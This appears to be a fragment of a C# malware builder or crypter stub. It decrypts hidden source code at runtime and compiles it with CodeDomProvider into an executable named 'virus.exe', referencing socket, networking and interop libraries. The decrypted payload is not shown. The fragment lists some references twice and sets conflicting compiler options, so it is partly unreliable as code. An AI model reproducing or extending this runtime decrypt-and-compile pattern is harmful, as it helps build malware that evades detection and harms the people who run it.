CodeDomProvider provider = CodeDomProvider.CreateProvider("{0}");
CodeDomProvider.IsDefinedLanguage("{0}");
CompilerParameters parameters = new CompilerParameters(new string[] { "System.dll", "System.Drawing.dll", "System.Net.Sockets.dll", "System.Windows.Forms.dll", "System.Threading.Tasks.dll", "System.Net.dll", "System.Net.Sockets.dll", "System.Runtime.InteropServices.dll", "System.Threading.dll","System.Runtime.InteropServices.dll" });
parameters.GenerateExecutable = true;
parameters.OutputAssembly     = "virus.exe"; 
parameters.GenerateInMemory   = true; 
CompilerResults results = provider.CompileAssemblyFromSource(parameters, Decrypt(str));